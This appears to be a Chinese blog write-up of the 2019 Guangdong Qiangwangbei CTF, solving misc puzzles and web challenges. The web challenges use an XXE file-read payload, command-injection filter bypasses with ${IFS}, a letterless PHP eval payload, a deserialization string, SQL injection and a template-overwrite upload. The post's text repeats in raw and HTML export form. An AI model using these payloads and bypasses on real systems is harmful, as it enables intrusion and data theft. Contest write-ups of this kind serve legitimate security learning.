脑筋急转弯\n下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用`SilentEye`可以提取出一个zip文件~~我去还有这操作~~\n![](/img/2019-09-11/img_3.png)\n然后爆破出密码\n![](/img/2019-09-11/img_4.png)\n得到一堆012012012又卡住了，后来某位大佬把0->`.`,1->`!`,2->`?`然后得到`Ook`码，然后`Ook`转`Brainfuck`转`text`然后就解出来了O_o..(空格要去掉)\n```\nlalala,wo shi mai bao de xiao hang jia.flag{08277716193eda6c592192966e9d6f39} ni neng cai dao ta me?\n```\nflag{08277716193eda6c592192966e9d6f39}\n\n##### web\n###### 小明又被拒绝了\n题目描述：小明又被拒绝了，你能帮助他吗？\n抓包添加请求头`X-Forwarded-For: 127.0.0.1`和把admin改为1\n![](/img/2019-09-11/img_5.png)\nflag{xxasdasdd_for}\n###### XX?\n题目描述：XXXXX？？？\n联想到XXE，扫描得到`index.php`和`flag.php`文件，扫描备份文件得到`index.php~`文件\n```php\n<?php\n#鍏抽棴Warning\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\n\n$xmlfile = file_get_contents('php://input');\n$dom = new DOMDocument();\n$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\n$creds = simplexml_import_dom($dom);\n$user = $creds->user;\n$pass = $creds->pass;\n\necho \"CTF:\" . \"<br>\" . \"$user\";\n?>\n```\nPOST上去一个xxe的payload\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note[\n<!ELEMENT note (user)>\n<!ENTITY hack3r \"Hu3sky\">\n]>\n<note>\n<user>&hack3r;</user>\n</note>\n```\n![](/img/2019-09-11/img_6.png)\n成了，有戏，试着读了一下`/etc/passwd`文件\n![](/img/2019-09-11/img_7.png)\nok,已经可以任意文件读取了\n尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了\n![](/img/2019-09-11/img_8.png)\nflag{IUyasd8213123123890}\n\n###### 免费的,ping一下~\n题目描述：听说ping很好玩~\n考察命令执行，过滤了`<`，`>`，`&`，`|`，`空格`，`%0*`，还有一些关键字可以用拼接的方法绕过，可以用`${IFS}`替换空格，`$a=ca;$b=t;$a$b`这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行\n```\nA=;a=fl;b=ag;se\"\"d${IFS}-n${IFS}'16,18p'${IFS}/$a$b\n```\n![](/img/2019-09-11/img_9.png)\nflag{llllll_U_GeT_Th3_fl4g}\n###### php\n题目描述：PHP是世界上最.....的语言\n扫描得到`index.php`\n```php\n<?php\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\nfunction GetYourFlag(){\n    echo file_get_contents(\"./flag.php\");\n}\n\nif(isset($_GET['code'])){\n    $code = $_GET['code'];\n    //print(strlen($code));\n    if(strlen($code)>27){ \n        die(\"Too Long.\");\n    }\n\n    if(preg_match('/[a-zA-Z0-9_&^<>\"\\']+/',$_GET['code'])) {\n        die(\"Not Allowed.\");\n    }\n    @eval($_GET['code']);\n}else{\n      highlight_file(__FILE__);\n}\n?>\n```\n这是一个无字符马，可以参考freebuf上的一篇文章-->[传送门](https://www.freebuf.com/articles/web/186298.html)，这是php7的一个解析特性，简单来说就是通过和`~`符号异或出我们需要的字符。\n```\n(~%8F%97%8F%96%91%99%90)();\n```\n这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的\n![](/img/2019-09-11/img_10.png)\n然后上面也给了getflag的函数我们，直接调用就可以了\n```php\n<?php\n$a = urlencode(~'GetYourFlag');\necho $a;\n//%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98\n```\npayload为`(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();`\n![](/img/2019-09-11/img_11.png)\nflag{3904c5df2e894ca02a21004feb21e617}\n备注：php是世界上最好的语言hah\n###### API\n题目描述：API\n打开提示`Api!wow`，访问api目录提示\n![](/img/2019-09-11/img_12.png)\n提示`post filename`和传入一个数组，不赋值时候提示`json_decode error`,固传入一个json数组，盲猜file参数。结果正确\n![](/img/2019-09-11/img_13.png)\n在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php\n![](/img/2019-09-11/img_14.png)\n得到源码，看了下，是反序列化。把hack.php也读出来\n![](/img/2019-09-11/img_15.png)\n看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。([小声bb](https://www.freebuf.com/articles/web/167721.html):[全都是网上原题](https://www.cnblogs.com/pureqh/p/10161993.html?tdsourcetag=s_pctim_aiomsg))\n通过../index.php的过滤条件可以构造出反序列化的字符串\n```\nO:+4:\"hack\":1:{s:4:\"file\";s:15:\"fffffaa_not.php\";}\n```\n发送的时候需要url编码一下。然后得到源码fffffaa_not.php\n![](/img/2019-09-11/img_16.png)\n是一个写shell的功能。其中判断规则preg_match('[<>?]', $text)。\n这个绕过很简单了，变成数组就可以了。参考-->[传送门](https://blog.stkusami.com/archives/56)\n![](/img/2019-09-11/img_17.png)\n成了，直接getshell拿flag\n![](/img/2019-09-11/img_18.png)\nflag{Oiahhh1_iiu123}\n###### 找漏洞\n题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？\n这道题大佬做出来了，我就学习一波。\n根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。\n首先审计一下路由有什么可以用的。\n![](/img/2019-09-11/img_19.png)\n可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\\Http\\Controllers\\UserController 里面的index方法。\n![](/img/2019-09-11/img_20.png)\n可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据\n![](/img/2019-09-11/img_21.png)\n可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\\backup\\database\\factories\\UserFactory.php\n![](/img/2019-09-11/img_22.png)\n总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……\n![](/img/2019-09-11/img_23.png)\n登陆后台之后，就直接跳到上传吧\n![](/img/2019-09-11/img_24.png)\n首先带着cookie访问`http://119.61.19.212:8085/home/uploadto_upload`，会得到一个html\n![](/img/2019-09-11/img_25.png)\n意思是按照这个格式构造上传包。这里需要改改。Action填入的是`http://119.61.19.212:8085/home/uploadss/NotAllow6171`,`files`标签也要改。改成符合上传包的格式,这里需要注意`uploadss`后面是需要跟一个key，key从哪里来?回头看看数据库第二条。\n![](/img/2019-09-11/img_26.png)\n~~首先这里……十分恶心~~。刚开始一直以为上传点是不行的。然后我在源码注意到了`template.blade.php`。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦\n![](/img/2019-09-11/img_27.png)\n但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取\n![](/img/2019-09-11/img_28.png)\n这个怎么用呢，看下图吧\n![](/img/2019-09-11/img_29.png)\n构造post包发送\n![](/img/2019-09-11/img_30.png)\n访问`http://119.61.19.212:8085/home/profile`出flag\n![](/img/2019-09-11/img_31.png)\nflag{Ucan_wow_easy_qaq}","source":"_posts/2019-09-11-qiangwangbei-GD-writewp.md","raw":"---\ntitle: 2019广东省强网杯writeup\nindex_img: /img/2019-09-11/index.png\ndate: 2019-09-11 09:48:43\ntags: \n- web\n- misc\n- writewp\n---\n这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛~~脑洞~~难度不算太大，做的还算不错。\n<!--more-->\n##### misc\n###### 完美的错误\n\n题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？`RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX`\n关键点：避免字符混淆\n这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章-->[传送门](https://xz.aliyun.com/t/2255)\n错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了\n```python\n#-*-coding:utf-8\n__b58chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789' #这里原本是123456789A-Za-z的\n__b58base = len(__b58chars)\n\n\ndef b58encode(v):\n    \"\"\" encode v, which is a string of bytes, to base58.\n    \"\"\"\n\n    long_value = int(v.encode(\"hex_codec\"), 16)\n\n    result = ''\n    while long_value >= __b58base:\n        div, mod = divmod(long_value, __b58base)\n        result = __b58chars[mod] + result\n        long_value = div\n    result = __b58chars[long_value] + result\n\n    # Bitcoin does a little leading-zero-compression:\n    # leading 0-bytes in the input become leading-1s\n    nPad = 0\n    for c in v:\n        if c == '\\0':\n            nPad += 1\n        else:\n            break\n\n    return (__b58chars[0] * nPad) + result\n\n\ndef b58decode(v):\n    \"\"\" decode v into a string of len bytes\n    \"\"\"\n\n    long_value = 0L\n    for (i, c) in enumerate(v[::-1]):\n        long_value += __b58chars.find(c) * (__b58base ** i)\n\n    result = ''\n    while long_value >= 256:\n        div, mod = divmod(long_value, 256)\n        result = chr(mod) + result\n        long_value = div\n    result = chr(long_value) + result\n\n    nPad = 0\n    for c in v:\n        if c == __b58chars[0]:\n            nPad += 1\n        else:\n            break\n\n    result = chr(0) * nPad + result\n    return result\n\nif __name__ == \"__main__\":\n    # print  b58encode(\"hello world\")\n    print  b58decode(\"RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX\")\n```\nflag{adb88f7b70a20983833a7615fb103e01}\n###### 撸啊撸\n用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，`__mh_execute_header`、`/usr/lib/libSystem.B.dylib`这些都是mach-o的可执行文件格式~~别问我为什么知道，都是大佬发现的，我只是个复读机~~，修复文件头如下，找到一个有例子的文章可以参考-->[传送门](https://www.jianshu.com/p/07f361f6e0d0)\n![](/img/2019-09-11/img_1.png)![](/img/2019-09-11/img_2.png)\n程序关键伪代码如下\n```c\n#start\n__int64 start()\n{\n  __int64 result; // rax\n  char v1; // [rsp+10h] [rbp-30h]\n  __int64 v2; // [rsp+38h] [rbp-8h]\n\n  strcpy(&v1, \"938gce1`872db99db`b342d23c0g9g2d\");\n  if ( v1 == 48 )\n    sub_100000E40(&v1);\n  result = __stack_chk_guard;\n  if ( __stack_chk_guard == v2 )\n    result = 0LL;\n  return result;\n}\n#sub_100000E40\nint __fastcall sub_100000E40(const char *a1)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n\n  for ( i = 0; i < strlen(a1); ++i )\n    a1[i] ^= 1u;\n  return printf(\"flag为:%s\\n\", a1);\n}\n```\n```python\ncode = '938gce1`872db99db`b342d23c0g9g2d'\ntext = ''\nfor i in code:\n    text += chr(ord(i)^1)\nprint text\n#829fbd0a963ec88ecac253e32b1f8f3e\n```\nflag{829fbd0a963ec88ecac253e32b1f8f3e}\n###### 脑筋急转弯\n下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用`SilentEye`可以提取出一个zip文件~~我去还有这操作~~\n![](/img/2019-09-11/img_3.png)\n然后爆破出密码\n![](/img/2019-09-11/img_4.png)\n得到一堆012012012又卡住了，后来某位大佬把0->`.`,1->`!`,2->`?`然后得到`Ook`码，然后`Ook`转`Brainfuck`转`text`然后就解出来了O_o..(空格要去掉)\n```\nlalala,wo shi mai bao de xiao hang jia.flag{08277716193eda6c592192966e9d6f39} ni neng cai dao ta me?\n```\nflag{08277716193eda6c592192966e9d6f39}\n\n##### web\n###### 小明又被拒绝了\n题目描述：小明又被拒绝了，你能帮助他吗？\n抓包添加请求头`X-Forwarded-For: 127.0.0.1`和把admin改为1\n![](/img/2019-09-11/img_5.png)\nflag{xxasdasdd_for}\n###### XX?\n题目描述：XXXXX？？？\n联想到XXE，扫描得到`index.php`和`flag.php`文件，扫描备份文件得到`index.php~`文件\n```php\n<?php\n#鍏抽棴Warning\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\n\n$xmlfile = file_get_contents('php://input');\n$dom = new DOMDocument();\n$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\n$creds = simplexml_import_dom($dom);\n$user = $creds->user;\n$pass = $creds->pass;\n\necho \"CTF:\" . \"<br>\" . \"$user\";\n?>\n```\nPOST上去一个xxe的payload\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note[\n<!ELEMENT note (user)>\n<!ENTITY hack3r \"Hu3sky\">\n]>\n<note>\n<user>&hack3r;</user>\n</note>\n```\n![](/img/2019-09-11/img_6.png)\n成了，有戏，试着读了一下`/etc/passwd`文件\n![](/img/2019-09-11/img_7.png)\nok,已经可以任意文件读取了\n尝试读取flag.php的时候发现一直读取失败，百思不得其解，web访问也的确存在，队友用php伪协议拿到了\n![](/img/2019-09-11/img_8.png)\nflag{IUyasd8213123123890}\n\n###### 免费的,ping一下~\n题目描述：听说ping很好玩~\n考察命令执行，过滤了`<`，`>`，`&`，`|`，`空格`，`%0*`，还有一些关键字可以用拼接的方法绕过，可以用`${IFS}`替换空格，`$a=ca;$b=t;$a$b`这样的方法来绕过关键字，然后这道题用cat是cat不到flag的，返回的内容有限，所以查到可以用sed查看指定的行\n```\nA=;a=fl;b=ag;se\"\"d${IFS}-n${IFS}'16,18p'${IFS}/$a$b\n```\n![](/img/2019-09-11/img_9.png)\nflag{llllll_U_GeT_Th3_fl4g}\n###### php\n题目描述：PHP是世界上最.....的语言\n扫描得到`index.php`\n```php\n<?php\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\nfunction GetYourFlag(){\n    echo file_get_contents(\"./flag.php\");\n}\n\nif(isset($_GET['code'])){\n    $code = $_GET['code'];\n    //print(strlen($code));\n    if(strlen($code)>27){ \n        die(\"Too Long.\");\n    }\n\n    if(preg_match('/[a-zA-Z0-9_&^<>\"\\']+/',$_GET['code'])) {\n        die(\"Not Allowed.\");\n    }\n    @eval($_GET['code']);\n}else{\n      highlight_file(__FILE__);\n}\n?>\n```\n这是一个无字符马，可以参考freebuf上的一篇文章-->[传送门](https://www.freebuf.com/articles/web/186298.html)，这是php7的一个解析特性，简单来说就是通过和`~`符号异或出我们需要的字符。\n```\n(~%8F%97%8F%96%91%99%90)();\n```\n这个是phpinfo();的一个payload，可以看到webshell是可以成功执行的\n![](/img/2019-09-11/img_10.png)\n然后上面也给了getflag的函数我们，直接调用就可以了\n```php\n<?php\n$a = urlencode(~'GetYourFlag');\necho $a;\n//%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98\n```\npayload为`(~%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98)();`\n![](/img/2019-09-11/img_11.png)\nflag{3904c5df2e894ca02a21004feb21e617}\n备注：php是世界上最好的语言hah\n###### API\n题目描述：API\n打开提示`Api!wow`，访问api目录提示\n![](/img/2019-09-11/img_12.png)\n提示`post filename`和传入一个数组，不赋值时候提示`json_decode error`,固传入一个json数组，盲猜file参数。结果正确\n![](/img/2019-09-11/img_13.png)\n在这里浪费了很多时间来绕过stristr，发现是绕不过的。然后读取../index.php\n![](/img/2019-09-11/img_14.png)\n得到源码，看了下，是反序列化。把hack.php也读出来\n![](/img/2019-09-11/img_15.png)\n看来没错了。通过反序列化来读取fffffaa_not.php这个文件源码。([小声bb](https://www.freebuf.com/articles/web/167721.html):[全都是网上原题](https://www.cnblogs.com/pureqh/p/10161993.html?tdsourcetag=s_pctim_aiomsg))\n通过../index.php的过滤条件可以构造出反序列化的字符串\n```\nO:+4:\"hack\":1:{s:4:\"file\";s:15:\"fffffaa_not.php\";}\n```\n发送的时候需要url编码一下。然后得到源码fffffaa_not.php\n![](/img/2019-09-11/img_16.png)\n是一个写shell的功能。其中判断规则preg_match('[<>?]', $text)。\n这个绕过很简单了，变成数组就可以了。参考-->[传送门](https://blog.stkusami.com/archives/56)\n![](/img/2019-09-11/img_17.png)\n成了，直接getshell拿flag\n![](/img/2019-09-11/img_18.png)\nflag{Oiahhh1_iiu123}\n###### 找漏洞\n题目描述：小明失恋后写了一个CMS，你能帮他找找漏洞吗？\n这道题大佬做出来了，我就学习一波。\n根据题目给出的源码包，程序是laravel 框架写的，这套框架和Django的编程思想差不多。不懂的可以先去看看 laravel 框架的设计逻辑。\n首先审计一下路由有什么可以用的。\n![](/img/2019-09-11/img_19.png)\n可以看到有5个路由。漏洞入口点是第一个路由user_testpage/{id}，其余的都要登陆后才能使用。在App\\Http\\Controllers\\UserController 里面的index方法。\n![](/img/2019-09-11/img_20.png)\n可以看到有个注入，只是简单的替换了关键字。直接sqlmap跑。Dump出数据\n![](/img/2019-09-11/img_21.png)\n可以看到有3条数据。刚开始尝试了暴力破解等方法。都没成功。随后在github上找了hash对比的工具，刚开始并不顺利，全部hash都是false。接着翻源码的时候意外发现一个password，在\\backup\\database\\factories\\UserFactory.php\n![](/img/2019-09-11/img_22.png)\n总感觉后面的注释是密码。一试果然成功。数据库里面前两个的password都是假的……\n![](/img/2019-09-11/img_23.png)\n登陆后台之后，就直接跳到上传吧\n![](/img/2019-09-11/img_24.png)\n首先带着cookie访问`http://119.61.19.212:8085/home/uploadto_upload`，会得到一个html\n![](/img/2019-09-11/img_25.png)\n意思是按照这个格式构造上传包。这里需要改改。Action填入的是`http://119.61.19.212:8085/home/uploadss/NotAllow6171`,`files`标签也要改。改成符合上传包的格式,这里需要注意`uploadss`后面是需要跟一个key，key从哪里来?回头看看数据库第二条。\n![](/img/2019-09-11/img_26.png)\n~~首先这里……十分恶心~~。刚开始一直以为上传点是不行的。然后我在源码注意到了`template.blade.php`。才把文件名改成template.blade.php 。然后在哪触发呢？blade框架中是类似于一个模板，需要在Controller中用view的方法展现。所以刚好ProfileController.php 中view了。所以就可以通过此方法覆盖php文件啦\n![](/img/2019-09-11/img_27.png)\n但是回到上传那里，虽然不拦截后缀。却不能上传新文件，也不能覆盖php代码进去，所以这里可以利用框架特性。template.blade.php是个模板文件。有特有的语法。经别人点化后在源码中其实有一个文件读取\n![](/img/2019-09-11/img_28.png)\n这个怎么用呢，看下图吧\n![](/img/2019-09-11/img_29.png)\n构造post包发送\n![](/img/2019-09-11/img_30.png)\n访问`http://119.61.19.212:8085/home/profile`出flag\n![](/img/2019-09-11/img_31.png)\nflag{Ucan_wow_easy_qaq}","slug":"qiangwangbei-GD-writewp","published":1,"mouth":"09","updated":"2020-09-17T11:01:20.166Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckffbhoxs000wez8kbwpouvrj","content":"<p>这个比赛是想好好打的，第一天还好，项目做完了专心打了大半天，下午到快晚上的时候又有事情，导致后面就大概看了一下，没有怎么投入，不过这次比赛<del>脑洞</del>难度不算太大，做的还算不错。<br><a id=\"more\"></a></p>\n<h5 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h5><h6 id=\"完美的错误\"><a href=\"#完美的错误\" class=\"headerlink\" title=\"完美的错误\"></a>完美的错误</h6><p>题目描述：小明在实现避免字符混淆的编码算法时,不小心错位了数组，你能帮他还原代码吗？<code>RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX</code><br>关键点：避免字符混淆<br>这个提示是与base58编码有关，base58与base64的区别参考先知社区的一篇文章–&gt;<a href=\"https://xz.aliyun.com/t/2255\" target=\"_blank\" rel=\"noopener\">传送门</a><br>错位了数组应该是数字和字母换了位置，直接用哪里的代码改一下就出来了<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#-*-coding:utf-8</span>\n__b58chars = <span class=\"hljs-string\">'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz123456789'</span> <span class=\"hljs-comment\">#这里原本是123456789A-Za-z的</span>\n__b58base = len(__b58chars)\n\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">b58encode</span><span class=\"hljs-params\">(v)</span>:</span>\n    <span class=\"hljs-string\">\"\"\" encode v, which is a string of bytes, to base58.\n    \"\"\"</span>\n\n    long_value = int(v.encode(<span class=\"hljs-string\">\"hex_codec\"</span>), <span class=\"hljs-number\">16</span>)\n\n    result = <span class=\"hljs-string\">''</span>\n    <span class=\"hljs-keyword\">while</span> long_value &gt;= __b58base:\n        div, mod = divmod(long_value, __b58base)\n        result = __b58chars[mod] + result\n        long_value = div\n    result = __b58chars[long_value] + result\n\n    <span class=\"hljs-comment\"># Bitcoin does a little leading-zero-compression:</span>\n    <span class=\"hljs-comment\"># leading 0-bytes in the input become leading-1s</span>\n    nPad = <span class=\"hljs-number\">0</span>\n    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> v:\n        <span class=\"hljs-keyword\">if</span> c == <span class=\"hljs-string\">'\\0'</span>:\n            nPad += <span class=\"hljs-number\">1</span>\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-keyword\">break</span>\n\n    <span class=\"hljs-keyword\">return</span> (__b58chars[<span class=\"hljs-number\">0</span>] * nPad) + result\n\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">b58decode</span><span class=\"hljs-params\">(v)</span>:</span>\n    <span class=\"hljs-string\">\"\"\" decode v into a string of len bytes\n    \"\"\"</span>\n\n    long_value = <span class=\"hljs-number\">0L</span>\n    <span class=\"hljs-keyword\">for</span> (i, c) <span class=\"hljs-keyword\">in</span> enumerate(v[::<span class=\"hljs-number\">-1</span>]):\n        long_value += __b58chars.find(c) * (__b58base ** i)\n\n    result = <span class=\"hljs-string\">''</span>\n    <span class=\"hljs-keyword\">while</span> long_value &gt;= <span class=\"hljs-number\">256</span>:\n        div, mod = divmod(long_value, <span class=\"hljs-number\">256</span>)\n        result = chr(mod) + result\n        long_value = div\n    result = chr(long_value) + result\n\n    nPad = <span class=\"hljs-number\">0</span>\n    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> v:\n        <span class=\"hljs-keyword\">if</span> c == __b58chars[<span class=\"hljs-number\">0</span>]:\n            nPad += <span class=\"hljs-number\">1</span>\n        <span class=\"hljs-keyword\">else</span>:\n            <span class=\"hljs-keyword\">break</span>\n\n    result = chr(<span class=\"hljs-number\">0</span>) * nPad + result\n    <span class=\"hljs-keyword\">return</span> result\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:\n    <span class=\"hljs-comment\"># print  b58encode(\"hello world\")</span>\n    <span class=\"hljs-keyword\">print</span>  b58decode(<span class=\"hljs-string\">\"RJv9mjS1bM9MZafGV77uTyDaapNLSk6t358j2Mdf1pbCByjEiVpX\"</span>)</code></pre></p>\n<p>flag{adb88f7b70a20983833a7615fb103e01}</p>\n<h6 id=\"撸啊撸\"><a href=\"#撸啊撸\" class=\"headerlink\" title=\"撸啊撸\"></a>撸啊撸</h6><p>用winhex搜索png文件尾发现后面多了东西，提取出来后发现是一段程序，但是文件头损坏了，<code>__mh_execute_header</code>、<code>/usr/lib/libSystem.B.dylib</code>这些都是mach-o的可执行文件格式<del>别问我为什么知道，都是大佬发现的，我只是个复读机</del>，修复文件头如下，找到一个有例子的文章可以参考–&gt;<a href=\"https://www.jianshu.com/p/07f361f6e0d0\" target=\"_blank\" rel=\"noopener\">传送门</a><br><img src=\"/img/2019-09-11/img_1.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><img src=\"/img/2019-09-11/img_2.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>程序关键伪代码如下<br><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#start</span>\n__<span class=\"hljs-function\">int64 <span class=\"hljs-title\">start</span><span class=\"hljs-params\">()</span>\n</span>&#123;\n  __int64 result; <span class=\"hljs-comment\">// rax</span>\n  <span class=\"hljs-keyword\">char</span> v1; <span class=\"hljs-comment\">// [rsp+10h] [rbp-30h]</span>\n  __int64 v2; <span class=\"hljs-comment\">// [rsp+38h] [rbp-8h]</span>\n\n  <span class=\"hljs-built_in\">strcpy</span>(&amp;v1, <span class=\"hljs-string\">\"938gce1`872db99db`b342d23c0g9g2d\"</span>);\n  <span class=\"hljs-keyword\">if</span> ( v1 == <span class=\"hljs-number\">48</span> )\n    sub_100000E40(&amp;v1);\n  result = __stack_chk_guard;\n  <span class=\"hljs-keyword\">if</span> ( __stack_chk_guard == v2 )\n    result = <span class=\"hljs-number\">0L</span>L;\n  <span class=\"hljs-keyword\">return</span> result;\n&#125;\n#sub_100000E40\n<span class=\"hljs-keyword\">int</span> __<span class=\"hljs-function\">fastcall <span class=\"hljs-title\">sub_100000E40</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">const</span> <span class=\"hljs-keyword\">char</span> *a1)</span>\n</span>&#123;\n  <span class=\"hljs-keyword\">int</span> i; <span class=\"hljs-comment\">// [rsp+14h] [rbp-Ch]</span>\n\n  <span class=\"hljs-keyword\">for</span> ( i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-built_in\">strlen</span>(a1); ++i )\n    a1[i] ^= <span class=\"hljs-number\">1u</span>;\n  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"flag为:%s\\n\"</span>, a1);\n&#125;</code></pre></p>\n<pre><code class=\"hljs python\">code = <span class=\"hljs-string\">'938gce1`872db99db`b342d23c0g9g2d'</span>\ntext = <span class=\"hljs-string\">''</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> code:\n    text += chr(ord(i)^<span class=\"hljs-number\">1</span>)\n<span class=\"hljs-keyword\">print</span> text\n<span class=\"hljs-comment\">#829fbd0a963ec88ecac253e32b1f8f3e</span></code></pre>\n<p>flag{829fbd0a963ec88ecac253e32b1f8f3e}</p>\n<h6 id=\"脑筋急转弯\"><a href=\"#脑筋急转弯\" class=\"headerlink\" title=\"脑筋急转弯\"></a>脑筋急转弯</h6><p>下载回来是一个wav音频文件，没发现摩斯频谱也没发现什么就卡住了，后来队友说用<code>SilentEye</code>可以提取出一个zip文件<del>我去还有这操作</del><br><img src=\"/img/2019-09-11/img_3.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>然后爆破出密码<br><img src=\"/img/2019-09-11/img_4.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>得到一堆012012012又卡住了，后来某位大佬把0-&gt;<code>.</code>,1-&gt;<code>!</code>,2-&gt;<code>?</code>然后得到<code>Ook</code>码，然后<code>Ook</code>转<code>Brainfuck</code>转<code>text</code>然后就解出来了O_o..(空格要去掉)<br><pre><code class=\"hljs undefined\">lalala,wo <span class=\"hljs-keyword\">shi </span>mai <span class=\"hljs-keyword\">bao </span>de xiao hang <span class=\"hljs-keyword\">jia.flag&#123;08277716193eda6c592192966e9d6f39&#125; </span>ni neng cai dao ta me?</code></pre></p>\n<p>flag{08277716193eda6c592192966e9d6f39}</p>\n<h5 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h5><h6 id=\"小明又被拒绝了\"><a href=\"#小明又被拒绝了\" class=\"headerlink\" title=\"小明又被拒绝了\"></a>小明又被拒绝了</h6><p>题目描述：小明又被拒绝了，你能帮助他吗？<br>抓包添加请求头<code>X-Forwarded-For: 127.0.0.1</code>和把admin改为1<br><img src=\"/img/2019-09-11/img_5.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>flag{xxasdasdd_for}</p>\n<h6 id=\"XX\"><a href=\"#XX\" class=\"headerlink\" title=\"XX?\"></a>XX?</h6><p>题目描述：XXXXX？？？<br>联想到XXE，扫描得到<code>index.php</code>和<code>flag.php</code>文件，扫描备份文件得到<code>index.php~</code>文件<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n<span class=\"hljs-comment\">#鍏抽棴Warning</span>\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\n\n$xmlfile = file_get_contents(<span class=\"hljs-string\">'php://input'</span>);\n$dom = <span class=\"hljs-keyword\">new</span> DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);\n\n$creds = simplexml_import_dom($dom);\n$user = $creds-&gt;user;\n$pass = $creds-&gt;pass;\n\n<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"CTF:\"</span> . <span class=\"hljs-string\">\"&lt;br&gt;\"</span> . <span class=\"hljs-string\">\"$user\"</span>;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>POST上去一个xxe的payload<br><pre><code class=\"hljs xml\"><span class=\"php\"><span class=\"hljs-meta\">&lt;?</span>xml version=<span class=\"hljs-string\">\"1.0\"</span><span class=\"hljs-meta\">?&gt;</span></span>\n<span class=\"hljs-meta\">&lt;!DOCTYPE note[\n&lt;!ELEMENT note (user)&gt;\n&lt;!ENTITY hack3r \"Hu3sky\"&gt;\n]&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">note</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">user</span>&gt;</span>&amp;hack3r;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">user</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">note</span>&gt;</span></code></pre></p>\n<p><img src=\"/img/2019-09-11/img_6.png\" srcset=\"/img/static/loading.gif\" alt=\"\"><br>成了，有戏，试着读了一下<code>/etc/passwd</code>文件<br><img src=\"/img/2019-09-11/img_7.png\" srcset=\"/img/static/loading.gif\" 